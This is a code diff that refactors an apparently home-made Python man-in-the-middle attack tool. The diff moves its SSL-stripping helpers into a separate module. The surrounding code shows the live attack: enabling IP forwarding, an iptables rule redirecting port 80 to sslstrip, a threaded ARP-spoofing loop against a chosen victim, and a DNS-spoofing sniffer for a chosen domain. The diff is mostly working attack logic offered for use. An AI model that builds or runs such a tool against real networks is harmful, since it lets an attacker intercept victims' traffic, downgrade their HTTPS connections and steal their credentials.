@@ -9,35 +9,7 @@ import threading
 import scapy.all as sc
 import time
 import signal
-
-
-sslstrip_proc = None
-
-def start_ip_forwarding():
-    print("[*] Enabling IP forwarding...")
-    os.system("sudo sysctl -w net.ipv4.ip_forward=1")
-
-def stop_ip_forwarding():
-    print("[*] Disabling IP forwarding...")
-    os.system("sudo sysctl -w net.ipv4.ip_forward=0")
-
-def start_iptables_redirect():
-    print("[*] Adding iptables rule to redirect port 80 to 8080...")
-    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
-
-def stop_iptables_redirect():
-    print("[*] Flushing iptables nat table to remove redirect rule...")
-    os.system("sudo iptables -t nat -F")
-
-def start_sslstrip():
-    global sslstrip_proc
-    print("[*] Starting sslstrip on port 8080...")
-    os.system("sudo python2.7 sslstrip/sslstrip.py -l 8080 &")
-    print("[*] SSL strip started.")
-
-def stop_sslstrip():
-    print("[*] Stopping SSL strip...")
-    os.system("sudo pkill -f sslstrip.py")
+import sslstripping_script as sslstrip
 
 
 def print_title():
@@ -78,43 +50,43 @@ def handle_command(cmd):
     if cmd.startswith("start"):
         # Example usage: start -ip 192.168.1.10 -mac aa:bb:cc:dd:ee:ff -iptospoof 192.168.1.1
         args = shlex.split(cmd)
-        ip = mac = ipToSpoof = None
+        ip = mac = spoofed_ip = None
         for i, arg in enumerate(args):
             if arg == "-ip" and i + 1 < len(args):
                 ip = args[i + 1]
             elif arg == "-mac" and i + 1 < len(args):
                 mac = args[i + 1]
             elif arg == "-iptospoof" and i + 1 < len(args):
-                ipToSpoof = args[i + 1]
-        if not ip or not mac or not ipToSpoof:
+                spoofed_ip = args[i + 1]
+        if not ip or not mac or not spoofed_ip:
             print("[!] Usage: start -ip <target_ip> -mac <target_mac> -iptospoof <spoofed_ip>")
             return
-        print("[*] Spoofing %s (MAC: %s ) as %s ... Press Ctrl+C to stop." % (ip, mac, ipToSpoof))
+        print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
 
-        start_ip_forwarding()
-        start_iptables_redirect()
-        start_sslstrip()
+        sslstrip.start_ip_forwarding()
+        sslstrip.start_iptables_redirect()
+        sslstrip.start_sslstrip()
 
         target_domain = raw_input("Enter the domain to spoof (e.g. example.com.): ").strip()
         if not target_domain.endswith('.'):
             target_domain += '.'
         target_domain = target_domain.encode()
-        print("[*] Spoofing %s (MAC: %s) as %s and DNS spoofing %s ... Press Ctrl+C to stop." % (ip, mac, ipToSpoof, target_domain))
+        print("[*] Spoofing %s (MAC: %s) as %s and DNS spoofing %s ..." % (ip, mac, spoofed_ip, target_domain.decode()))
 
-        def arp_spoof_loop(ip, mac, iptospoof):
-            print("[*] Spoofing %s (MAC: %s ) as %s ... Press Ctrl+C to stop." % (ip, mac, iptospoof))
+        def arp_spoof_loop(ip, mac, spoofed_ip):
+            print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
             while True:
-                arp_spoof(ip, mac, iptospoof)
+                arp_spoof(ip, mac, spoofed_ip)
                 time.sleep(2)
 
         # Start a new thread for DNS spoofing in order 
         def dns_spoof_thread():
             sc.sniff(
                 filter=("udp port 53 and src %s" % ip),
-                prn=lambda packet: dns_spoof(packet, ip, ipToSpoof, target_domain)
+                prn=lambda packet: dns_spoof(packet, ip, spoofed_ip, target_domain)
             )
         
-        arp_thread = threading.Thread(target=arp_spoof_loop, args=(ip, mac, ipToSpoof))
+        arp_thread = threading.Thread(target=arp_spoof_loop, args=(ip, mac, spoofed_ip))
         arp_thread.daemon = True
         arp_thread.start()
 
@@ -140,14 +112,17 @@ def handle_command(cmd):
         print("[!] Starting in aggressive mode (heavy traffic injection)...")
         # Start spoofing with aggressive settings
     elif cmd == "stop":
-        stop_sslstrip()
-        stop_iptables_redirect()
-        stop_ip_forwarding()
+        sslstrip.stop_sslstrip()
+        sslstrip.stop_iptables_redirect()
+        sslstrip.stop_ip_forwarding()
         print("[*] Stopping attacks...")
         # Stop attacks 
     elif cmd == "help":
         print_commands()
     elif cmd == "exit":
+        sslstrip.stop_sslstrip()
+        sslstrip.stop_iptables_redirect()
+        sslstrip.stop_ip_forwarding()
         print("[*] Exiting...")
         exit(0)
     else:
